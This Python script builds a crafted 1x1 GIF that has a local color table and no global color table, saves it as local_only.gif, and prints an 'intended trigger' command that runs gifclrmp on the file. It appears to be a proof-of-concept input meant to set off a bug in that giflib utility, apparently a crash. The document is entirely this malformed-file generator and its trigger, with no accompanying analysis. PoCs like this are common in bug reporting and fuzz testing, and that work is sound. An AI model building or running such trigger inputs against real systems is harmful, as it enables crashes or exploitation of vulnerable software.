
from pathlib import Path


def build_local_only_gif() -> bytes:
    out = bytearray()
    out += b"GIF89a"

    # Logical Screen Descriptor: width=1, height=1
    out += (1).to_bytes(2, "little")
    out += (1).to_bytes(2, "little")

    # Packed field: no global color table
    out += b"\x00"

    # Background color index, pixel aspect ratio
    out += b"\x00\x00"

    # Image Descriptor
    out += b"\x2c"                  # image separator
    out += b"\x00\x00"              # left
    out += b"\x00\x00"              # top
    out += b"\x01\x00"              # width = 1
    out += b"\x01\x00"              # height = 1

    # Packed field: local color table present, 2 entries
    out += b"\x80"

    # Local Color Table: black, white
    out += b"\x00\x00\x00\xff\xff\xff"

    # Image Data
    out += b"\x02\x02\x4c\x01\x00"

    # Trailer
    out += b"\x3b"
    return bytes(out)


def main() -> int:
    out_path = Path("local_only.gif")
    out_path.write_bytes(build_local_only_gif())
    print(f"[+] wrote {out_path}")
    print("[+] intended trigger: ./gifclrmp -i 1 local_only.gif > /dev/null")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
